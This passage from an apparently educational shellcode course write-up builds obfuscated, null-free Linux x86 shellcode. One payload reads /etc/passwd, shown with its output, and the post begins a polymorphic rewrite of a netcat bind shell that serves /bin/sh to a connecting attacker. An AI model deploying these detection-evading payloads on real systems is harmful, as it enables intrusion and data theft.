+</code></pre><p>Because the only case where the end result is a 1 is when both bits are 1, if <code>two inverse values are ANDed onto EAX</code>, EAX will become zero.</p>
+<pre tabindex="0"><code>Binary                                Hexadecimal
+    1000101010011100100111101001010       0x454e4f4a
+AND 0111010001100010011000000110101   AND 0x3a313035
+------------------------------------  ---------------
+    0000000000000000000000000000000       0x00000000
+</code></pre><p>Using this technique two printable 32-bit values are also <code>bitwise inverses of each other</code>.</p>
+<blockquote>
+<p>What&rsquo;s the advantage?</p>
+</blockquote>
+<p><code>eax</code> can be zeroed without using null bytes, and the outcome is assembled machine code will be printable text.</p>
+<blockquote>
+<p>From <a href="https://www.dmi.unipg.it/~bista/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html">https://www.dmi.unipg.it/~bista/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html</a></p>
+</blockquote>
+<hr>
+<p>Getting back to our exercise, let&rsquo;s use our code to demonstrate how we leverage this technique to our purpose.</p>
+<p>The instructions used with this technique are:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x4a2f</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">and</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x358b</span>
+</span></span></code></pre></div><p>The main goal is <code>eax</code> value becomes <code>0xb</code> (execve syscall). So let&rsquo;s see below why we used this values to perform the <code>AND</code> operation and the result of it.</p>
+<pre tabindex="0"><code>Binary                    Hexadecimal
+    0100 1010 0010 1111       0x4a2f
+AND 0011 0101 1000 1011   AND 0x358b
+-----------------------  -------------
+    0000 0000 0000 1011       0x000b
+</code></pre><p>This too values are the inverse of each in the higher 8 bits, but in the low 8 bits they result in <code>0xb</code>, the execve syscall.</p>
+<blockquote>
+<p>Will an antivirus or a human able to spot this by only looking at it?</p>
+</blockquote>
+<p>Checking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/cat_passwd-shellcode-571 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ../../../assembler.sh cat_passwd.nasm                              
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">61</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xb8\xff\xff\xff\xff\x40\x99\x8d\x5c\x24\xf4\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x8d\x4b\xf0\x52\x68\x74\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x66\xb8\x2f\x4a\x52\x80\x74\x24\x0c\x07\x51\x53\x89\xe1\x66\x25\x8b\x35\xcd\x80&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb8\xff\xff\xff\xff\x40\x99\x8d\x5c\x24\xf4\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x8d\x4b\xf0\x52\x68\x74\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x66\xb8\x2f\x4a\x52\x80\x74\x24\x0c\x07\x51\x53\x89\xe1\x66\x25\x8b\x35\xcd\x80</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/cat_passwd-shellcode-571 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c
+</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/cat_passwd-shellcode-571 ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">61</span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/usr/bin/zsh
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>dnsmasq:x:105:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>rtkit:x:107:113:RealtimeKit,,,:/proc:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>pulse:x:108:117:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>speech-dispatcher:x:109:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+</span></span><span style="display:flex;"><span>avahi:x:110:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>saned:x:111:120::/var/lib/saned:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>colord:x:112:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+</span></span><span style="display:flex;"><span>lightdm:x:114:122:Light Display Manager:/var/lib/lightdm:/bin/false
+</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>edu:x:1000:1000:edu:/home/edu:/usr/bin/zsh
+</span></span></code></pre></div><p><strong>Size: 61 bytes</strong></p>
+<p>Increased <code>41,9%</code> which reflects in more 17 bytes.</p>
+<h2 id="shellcode-3---nc--lvvebinsh--p13377">Shellcode 3 - nc -lvve/bin/sh -p13377<a hidden class="anchor" aria-hidden="true" href="#shellcode-3---nc--lvvebinsh--p13377">#</a></h2>
+<hr>
+<h3 id="sharing-some-thoughts">Sharing some thoughts<a hidden class="anchor" aria-hidden="true" href="#sharing-some-thoughts">#</a></h3>
+<blockquote>
+<p>This was by far the most challenging exercise I had during the course</p>
+</blockquote>
+<p>At some point I turn it into a personal thing because I was decided to put the techniques I learned from the msfvenom shellcode analysis assignment into this exercise and nothing seems to not working at all.</p>
+<p>One constraint that I need to bypass was the fact that I generated the msfvenoom shellcodes with null bytes.</p>
+<p>This time I couldn&rsquo;t use null bytes and that&rsquo;s why I needed to review how msfvenom generates shellcode without null-bytes and tried to apply that methodology into this task.</p>
+<p>This way I will present <code>two polymorphic versions</code> of this shellcode: one shellcode with null bytes and other null-free shellcode.</p>
+<p>Then, we can compare the differences between them and reflect how hard is to develop a null-free shellcode.</p>
+<p>The following quote tells the mindset we should have <strong>to not give up when we face a complex problem</strong> and resumes how difficult it was for me to make it working.</p>
+<blockquote>
+<pre><code>  Intelligence is the ability to adapt to change,
+                                                by Stephen Hawking
+</code></pre>
+</blockquote>
+<hr>
+<p>After this, let&rsquo;s get to the point.</p>
+<p>This shellcode was written by an Anonymous user, and is located <a href="https://shell-storm.org/shellcode/files/shellcode-804.html">here</a>. As the shellcode description says, this shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker.</p>
+<p>The original shellcode does not have any comments, so I added some to be easier to understabds its internals.</p>
+<p><strong>Size: 62 bytes</strong></p>
+<pre tabindex="0"><code>linux x86 nc -lvve/bin/sh -p13377 shellcode
+This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker
+Author: Anonymous
+Site: http://chaossecurity.wordpress.com/
+Here is code written in NASM
+/////////////////////////////
+section .text
+    global _start
+_start:
+xor eax,eax
+xor edx,edx
+push 0x37373333	; 7733
+push 0x3170762d	; 1pv-
+mov edx, esp
+push eax
+push 0x68732f6e	; hs/n
+push 0x69622f65	; ib/e
+push 0x76766c2d	; vvl-
+mov ecx,esp
+push eax
+push 0x636e2f2f	; cn//
+push 0x2f2f2f2f	; ////
+push 0x6e69622f	; nib/
+mov ebx, esp
+push eax
+push edx
+push ecx
+push ebx
+xor edx,edx
+mov  ecx,esp
+mov al,11		; execve syscall
+int 0x80
+//////////////////////////////////
+And here is objdump from which you can see the shellcode
+//////////////////////////////////
+teo@teo-desktop ~ $ objdump -d a.out
+a.out:     file format elf32-i386
+Disassembly of section .text:
+08048060 &lt;.text&gt;:
+ 8048060:   31 c0                   xor    %eax,%eax
+ 8048062:   31 d2                   xor    %edx,%edx
+ 8048064:   68 33 33 37 37          push   $0x37373333
+ 8048069:   68 2d 76 70 31          push   $0x3170762d
+ 804806e:   89 e2                   mov    %esp,%edx
+ 8048070:   50                      push   %eax
+ 8048071:   68 6e 2f 73 68          push   $0x68732f6e
+ 8048076:   68 65 2f 62 69          push   $0x69622f65
+ 804807b:   68 2d 6c 76 76          push   $0x76766c2d
+ 8048080:   89 e1                   mov    %esp,%ecx
+ 8048082:   50                      push   %eax
+ 8048083:   68 2f 2f 6e 63          push   $0x636e2f2f
+ 8048088:   68 2f 2f 2f 2f          push   $0x2f2f2f2f
+ 804808d:   68 2f 62 69 6e          push   $0x6e69622f
+ 8048092:   89 e3                   mov    %esp,%ebx
+ 8048094:   50                      push   %eax
+ 8048095:   52                      push   %edx
+ 8048096:   51                      push   %ecx
+ 8048097:   53                      push   %ebx
+ 8048098:   31 d2                   xor    %edx,%edx
+ 804809a:   89 e1                   mov    %esp,%ecx
+ 804809c:   b0 0b                   mov    $0xb,%al
+ 804809e:   cd 80                   int    $0x80
+</code></pre><p>I said above for this exercise I had completely different approach than others.</p>
+<p>The inspiration was the methodology used by the previous analyzed msfvenom shellcodes.</p>
+<p>I will present first the shellcode with null bytes.</p>
+<h3 id="null-byte-shellcode">Null Byte Shellcode<a hidden class="anchor" aria-hidden="true" href="#null-byte-shellcode">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cdq</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">call</span> <span style="color:#66d9ef">$</span><span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span>    <span style="color:#66d9ef">eax</span>,<span style="color:#ae81ff">0x33317076</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">esi</span>,<span style="color:#66d9ef">DWORD</span> [<span style="color:#66d9ef">edi</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aaa</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>    <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">al</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">edx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">call</span> <span style="color:#66d9ef">$</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x13</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span>   <span style="color:#66d9ef">eax</span>,<span style="color:#ae81ff">0x6576766c</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bound</span>  <span style="color:#66d9ef">ebp</span>, [<span style="color:#66d9ef">ecx</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x6e</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jae</span> <span style="color:#66d9ef">$</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x6a</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>    <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">al</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ecx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">call</span> <span style="color:#66d9ef">$</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x12</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bound</span>  <span style="color:#66d9ef">ebp</span>, [<span style="color:#66d9ef">ecx</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x6e</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">das</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">outsb</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">arpl</span> <span style="color:#66d9ef">word</span> [<span style="color:#66d9ef">eax</span>],<span style="color:#66d9ef">ax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ebx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ecx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ebx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0x454e4a2f</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">;add ax, 0x1000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">edx</span>,<span style="color:#66d9ef">edx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>  <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">esp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">and</span> <span style="color:#66d9ef">eax</span>,<span style="color:#ae81ff">0x3a31358b</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
+</span></span></code></pre></div><p>Let&rsquo;s divide and conquer one more time.</p>
+<p>The code is divided in parts related to each argument of the command to executed by execve.</p>
+<p>Each part is delimited by a <code>call</code> and a <code>pop</code> instruction. The isntruction inside this part are used to prepare an argument. The <code>pop $Register</code> instruction is used to put the address pointer of the argument from <code>esp</code> to the related register depending on <code>each argument position of execve</code> we are dealing.</p>
+<ul>
+<li>4th argument - pop <code>edx</code></li>
+<li>3rd argument - pop <code>ecx</code></li>
+<li>2nd argument - pop <code>ebx</code></li>
+<li>1st argument - pop <code>eax</code></li>
+</ul>
+<p>So the <code>pop</code> instruction will tell us what execve argument we were preparing of. The same process used to execute any syscall but with obfuscated code.</p>
+<p>For example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>            
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cdq</span>                     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">call</span> <span style="color:#66d9ef">$</span><span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf</span>				<span style="color:#75715e">; Start
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">sub</span>  <span style="color:#66d9ef">eax</span>,<span style="color:#ae81ff">0x33317076</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span>  <span style="color:#66d9ef">esi</span>,<span style="color:#66d9ef">DWORD</span> [<span style="color:#66d9ef">edi</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aaa</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>  <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">al</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">edx</span>					<span style="color:#75715e">; end
+</span></span></span></code></pre></div><p><code>call $+0xf</code> tells us we are looking to a &ldquo;piece&rdquo;  of code that is preparing the 4th argument because, the end of this part is <code>pop edx</code>.</p>
+<p>Between these instruction it seems that we have assembly instruction that doesn&rsquo;t make any sense that will be executed by the CPU but, this is not the case.</p>
+<p>By this time, you should be familiar with the x86 <code>calling conventions</code> and how <code>call</code> instruction behaves.</p>
+<blockquote>
+<p>Just a reminder, the <code>call</code> instruction pushes the return address (address immediately after the <code>call</code> instruction) on the stack and it changes <code>eip</code> to the call destination. This effectively transfers control to the call target and begins execution there.</p>
+</blockquote>
+<h4 id="so-what-are-these-instructions-doing-exactly">So what are these instructions doing exactly?<a hidden class="anchor" aria-hidden="true" href="#so-what-are-these-instructions-doing-exactly">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>            <span style="color:#75715e">; zeroes eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">cdq</span>                     <span style="color:#75715e">; zeroes edx (saves space)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">call</span> <span style="color:#66d9ef">$</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf</span>				<span style="color:#75715e">; jumps to pop ebx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">sub</span>  <span style="color:#66d9ef">eax</span>,<span style="color:#ae81ff">0x33317076</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span>  <span style="color:#66d9ef">esi</span>,<span style="color:#66d9ef">DWORD</span> [<span style="color:#66d9ef">edi</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aaa</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>  <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">al</span>     
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pop</span> <span style="color:#66d9ef">edx</span>             	<span style="color:#75715e">; saving execve 4th argument				
+</span></span></span></code></pre></div><p>Firstly, we are clearing <code>eax</code> and <code>edx</code> registers, the we use <code>call</code> to save next isntruction address and jump to the <code>pop ebx</code> instruction.</p>
+<p><strong>Why $ + 0xf?</strong></p>
+<p>Well,  the <code>$</code> holds the address of the current instruction. As an example, let&rsquo;s use the above code and compare the disassembled output with <code>objdump -M intel -d netcat_nullbyte_shellcode</code></p>
+<pre tabindex="0"><code>xor eax, eax
+cdq
+
+call $+ 0xf             ; $ holds address of call opcode
+sub    eax,0x33317076
+xor    esi,DWORD [edi]
+aaa
+add    byte [eax], al
+pop edx
+---
+08049000 &lt;_start&gt;:
+ 8049000:       31 c0                   xor    eax,eax
+ 8049002:       99                      cdq    
+ 8049003:       e8 0a 00 00 00          call   8049012 &lt;_start+0x12&gt;
+ 8049008:       2d 76 70 31 33          sub    eax,0x33317076
+ 804900d:       33 37                   xor    esi,DWORD PTR [edi]
+ 804900f:       37                      aaa    
+ 8049010:       00 00                   add    BYTE PTR [eax],al
+ 8049012:       5a                      pop    edx
+</code></pre><p>Checking the opcodes (2nd column) there is as distance of 15 bytes between <code>pop edx</code> and the <code>call</code> instruction.</p>
+<blockquote>
+<p>Look how the <code>call</code> instruction introduces <code>null bytes</code> when used when redirects execution with an instruction with a <code>short distance</code>.</p>
+</blockquote>
+<p>So, we are storing the same bytes in <code>edx</code> as the original shellcode does. Instead of doing <code>push</code> instructions and put the bytes on the stack</p>
+<p><strong>Approach 1</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Not forget these are placed in Little-Endian format
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x37373333</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x3170762d</span>
+</span></span></code></pre></div><p><strong>Approach 2</strong></p>
+<p>We place the exact same bytes as opcodes in the code and put the address of the first byte in <code>edx</code></p>
+<pre tabindex="0"><code>2d 76 70 31 33          sub    eax,0x33317076
+33 77 04                xor    esi,DWORD PTR [edi+0x4]
+37                      aaa
+00 40 01                add    BYTE PTR [eax+0x1],al
+
+Hex bytes: **0x2D, 0x76, 0x70, 0x31, 0x33, 0x33, 0x77, 0x04, 0x37**, 0x00 
+</code></pre><p>Comparing both approaches we see they have the same exact bytes. We can check this with gdb</p>
+<p><img loading="lazy" src="/slae32/6/gef_opcode_bytes.png#center" alt="Approach 2 opcodes"  title="Approach 2 opcodes"  />
+</p>
+<p>The <code>approach 2</code> has the disadvantage to put null bytes because we need to specify the end of them while with <code>approach 1</code> we just <code>push</code> a zeroed register which does have null bytes.</p>
+<blockquote>
+<p>This is the main reason I struggled with <code>Approach 2</code> and why I need to rethink and completely change my approach to avoid null bytes.</p>
+</blockquote>
+<h3 id="null-byte-free-shellcode">Null Byte Free Shellcode<a hidden class="anchor" aria-hidden="true" href="#null-byte-free-shellcode">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fnop</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">argParser</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span>    <span style="color:#66d9ef">eax</span>,<span style="color:#ae81ff">0x33317076</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span>    <span style="color:#66d9ef">esi</span>,<span style="color:#66d9ef">DWORD</span> [<span style="color:#66d9ef">edi</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aaa</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nop</span>                     <span style="color:#75715e">; nops will be changed to nulls in runtime
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">esi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span>
